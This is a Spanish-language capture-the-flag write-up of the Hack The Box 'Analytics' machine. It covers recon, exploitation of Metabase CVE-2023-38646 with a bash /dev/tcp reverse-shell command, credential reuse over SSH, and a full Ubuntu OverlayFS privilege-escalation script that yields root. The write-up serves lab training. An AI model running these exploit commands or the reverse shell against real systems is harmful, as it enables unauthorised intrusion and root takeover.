---
title: "Analytics - WriteUp"
date: Fri Aug 16 2024 15:00:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, dirb, reverse-shell, cve, exploit, wfuzz, nginx, cve-2023-38646]
image: /assets/img/htb-writeups/Pasted-image-20231124124446.png
---

{% include machine-info.html
  machine="Analytics"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}

![Analytics](/assets/img/htb-writeups/Pasted-image-20231124124446.png)

-----

Máquina Linux

NMAP:

```bash
# Nmap 7.94SVN scan initiated Fri Nov 24 12:39:24 2023 as: nmap -sCV -p 22,80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.116.182
Nmap scan report for 10.129.116.182
Host is up (0.058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos un VHOST apuntando a "analytical.htb", actualizamos /etc/hosts y seguimos.

WEB

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124124446.png)

Posibles usuarios y un correo electrónico.

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124125721.png)

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124125807.png)

Si pulsamos sobre _Login_ intenta conectar con el subdominio _data_. Tendremos que agregarlo a nuestro archivo hosts.

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124130045.png)

Accedemos de nuevo y vemos la pantalla de login:

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124130247.png)

FUZZING

Como vemos que puede contener subdominios, vamos a intentar enumerarlos mediante fuzzing por si huberan más.

```bash
$ wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://analytical.htb' -H "Host: FUZZ.analytical.htb" --hc 302 
```

Parece que solo existe "data".

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124133742.png)

Ahora toca hacer un fuzzing de subdirectorios, hemos escondido las páginas con 27 líneas de longitud porque está configurado para que devuelva estado 200 en todas las páginas:

```bash
$ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl 27  -t 100 http://data.analytical.htb/FUZZ
```

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124135838.png)

Vamos a buscar si existen vulnerabilidades en la API de _MetaBase_

La vulnerabilidad es https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38646 y permite ejecutar código sin autenticación. 

Encontramos un exploit que se adapta a nuestro entorno.

https://github.com/Pyr0sec/CVE-2023-38646/tree/main

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124142156.png)

El exploit es "Pre-Auth" y requiere de un token que no tenemos para que se lleve a cabo la explotación y conseguir una reverse shell.

En la misma página del exploit nos da una referencia a otra web https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/ y nos explica dónde obtener el token que necesitamos.

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124142559.png)

Vamos a la ruta que nos indica y buscamos el "setup token" que necesitamos.

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124142740.png)

Tenemos el token que nos hacía falta.

Lanzamos el exploit no sin antes ponernos en escucha con _netcat_ para recibir la reverse shell.

```bash
$ python3 exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.16.25/9001 0>&1"
```

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124144442.png)

Y pa dentro...

Por la IP y el prompt parece que estamos en un contenedor y no en el propio host.

Vamos a enumerar para intentar salir del contenedor.

Empezamos con _env_

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124152021.png)

Encontramos unas credenciales:

```http
metalytics:An4lytics_ds20223#
```

Como tiene el puerto 22 abierto, vamos a usarlas para conectar por SSH a la máquina host:

```bash
$ ssh metalytics@10.129.116.182
...
Password: An4lytics_ds20223#
```

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124152602.png)

Perfecto, estamos en la máquina host!

Registramos la primera bandera y enumeramos...

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124154858.png)

Vamos a buscar vulnerabilidades de kernel, por si las tuviera.

Encontramos esta: https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/

![ANALYTICS](/assets/img/htb-writeups/Pasted-image-20231124155818.png)

Creamos un archivo en /tmp y lo llamaremos _exploit.sh_ y dentro escribiremos lo siguiente:

```bash
#!/bin/bash  

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

Le damos permisos de ejecución y lo ejecutamos.

```bash
metalytics@analytics:/tmp$ ./exploit.sh 

root@analytics:/tmp# whoami
root

root@analytics:/tmp# cat /root/root.txt
36e6388e8c93cc40fdbaeb585ae010c2 
```

Perfecto! otra bandera para la colección!

---------

ANEXO:
Otro exploit para compilar con _gcc_
https://github.com/briskets/CVE-2021-3493

------
---

**Última actualización**: 2024-08-16<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
